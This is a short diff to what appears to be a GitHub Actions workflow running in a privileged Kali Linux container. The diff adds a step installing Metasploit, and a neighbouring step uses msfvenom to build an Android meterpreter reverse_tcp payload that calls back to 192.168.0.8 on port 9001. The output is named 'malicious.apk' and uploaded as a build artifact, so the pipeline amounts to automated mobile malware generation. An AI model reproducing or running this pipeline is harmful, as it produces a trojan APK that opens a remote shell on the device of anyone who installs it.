@@ -11,6 +11,7 @@ jobs:
       image: "kalilinux/kali-last-release:latest"
       options: --privileged
     steps:
+      - run: apt-get update && apt-get install -y metasploit-framework
       - run: msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=192.168.0.8 lport=9001 R -o malicious.apk
       - name: upload
         uses: actions/upload-artifact@v4
